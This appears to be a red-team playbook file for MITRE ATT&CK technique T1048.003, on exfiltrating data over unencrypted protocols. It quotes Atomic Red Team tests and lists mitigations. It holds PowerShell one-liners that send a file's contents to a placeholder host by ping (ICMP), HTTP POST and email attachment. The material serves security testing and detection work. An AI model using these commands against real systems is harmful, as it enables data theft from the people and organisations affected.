---
name: "T1048.003_exfiltration-over-unencrypted-non-c2-protocol"
description: "Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel."
category: "client-side"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1048.003
  - exfiltration
  - esxi
  - linux
  - macos
  - network-devices
  - windows
  - sub-technique
technique_id: "T1048.003"
tactic: "exfiltration"
all_tactics:
  - exfiltration
platforms:
  - ESXi
  - Linux
  - macOS
  - Network Devices
  - Windows
mitre_url: "https://attack.mitre.org/techniques/T1048/003"
tech_stack:
  - esxi
  - linux
  - macos
  - network devices
  - windows
cwe_ids:
  - CWE-200
chains_with:
  - T1048
  - T1048.001
  - T1048.002
prerequisites:
  - T1048
severity_boost:
  T1048: "Chain with T1048 for deeper attack path"
  T1048.001: "Chain with T1048.001 for deeper attack path"
  T1048.002: "Chain with T1048.002 for deeper attack path"
---

# T1048.003 Exfiltration Over Unencrypted Non-C2 Protocol

> **Sub-technique of:** T1048

## High-Level Description

Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.

Adversaries may opt to obfuscate this data, without the use of encryption, within network protocols that are natively unencrypted (such as HTTP, FTP, or DNS). This may include custom or publicly available encoding/compression algorithms (such as base64) as well as embedding data within protocol headers and fields.

## Kill Chain Phase

- Exfiltration (TA0010)

**Platforms:** ESXi, Linux, macOS, Network Devices, Windows

## What to Check

- [ ] Identify if Exfiltration Over Unencrypted Non-C2 Protocol technique is applicable to target environment
- [ ] Check ESXi systems for indicators of Exfiltration Over Unencrypted Non-C2 Protocol
- [ ] Check Linux systems for indicators of Exfiltration Over Unencrypted Non-C2 Protocol
- [ ] Check macOS systems for indicators of Exfiltration Over Unencrypted Non-C2 Protocol
- [ ] Verify mitigations are bypassed or absent (4 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: Exfiltration Over Alternative Protocol - HTTP

A firewall rule (ipfw,pf,iptables or firewalld) will be needed to allow exfiltration on port 1337.

Upon successful execution, sh will be used to make a directory (/tmp/victim-staging-area), write a txt file, and host the directory with Python on port 1337, to be later downloaded.

**Supported Platforms:** macos, linux

### Atomic Test 2: Exfiltration Over Alternative Protocol - ICMP

Exfiltration of specified file over ICMP protocol.

Upon successful execution, powershell will utilize ping (icmp) to exfiltrate notepad.exe to a remote address (default 127.0.0.1). Results will be via stdout.

**Supported Platforms:** windows

```powershell
$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path #{input_file} -Encoding Byte -ReadCount 1024) { $ping.Send("#{ip_address}", 1500, $Data) }
```

### Atomic Test 3: Exfiltration Over Alternative Protocol - DNS

Exfiltration of specified file over DNS protocol.

**Supported Platforms:** linux

### Atomic Test 4: Exfiltration Over Alternative Protocol - HTTP

Exfiltration of specified file over HTTP.
Upon successful execution, powershell will invoke web request using POST method to exfiltrate notepad.exe to a remote address (default http://127.0.0.1). Results will be via stdout.

**Supported Platforms:** windows

```powershell
$content = Get-Content #{input_file}
Invoke-WebRequest -Uri #{ip_address} -Method POST -Body $content
```

### Atomic Test 5: Exfiltration Over Alternative Protocol - SMTP

Exfiltration of specified file over SMTP.
Upon successful execution, powershell will send an email with attached file to exfiltrate to a remote address. Results will be via stdout.

**Supported Platforms:** windows

```powershell
Send-MailMessage -From #{sender} -To #{receiver} -Subject "T1048.003 Atomic Test" -Attachments #{input_file} -SmtpServer #{smtp_server}
```

### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Exfiltration Over Unencrypted Non-C2 Protocol by examining the target platforms (ESXi, Linux, macOS).

2. **Assess Existing Defenses**: Review whether mitigations for T1048.003 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1031 Network Intrusion Prevention

Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary command and control infrastructure and malware can be used to mitigate activity at the network level.

### M1057 Data Loss Prevention

Data loss prevention can detect and block sensitive data being sent over unencrypted protocols.

### M1037 Filter Network Traffic

Enforce proxies and use dedicated servers for services such as DNS and only allow those systems to communicate over respective ports/protocols, instead of all systems within a network.

### M1030 Network Segmentation

Follow best practices for network firewall configurations to allow only necessary ports and traffic to enter and exit the network.

## Detection

### Detection of Exfiltration Over Unencrypted Non-C2 Protocol

## Risk Assessment

| Finding                                                            | Severity | Impact       |
| ------------------------------------------------------------------ | -------- | ------------ |
| Exfiltration Over Unencrypted Non-C2 Protocol technique applicable | Medium   | Exfiltration |

## CWE Categories

| CWE ID  | Title                             |
| ------- | --------------------------------- |
| CWE-200 | Exposure of Sensitive Information |

## References

- [copy_cmd_cisco](https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/fundamentals/command/cf_command_ref/C_commands.html#wp1068167689)
- [University of Birmingham C2](https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf)
- [Atomic Red Team - T1048.003](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1048.003)
- [MITRE ATT&CK - T1048.003](https://attack.mitre.org/techniques/T1048/003)
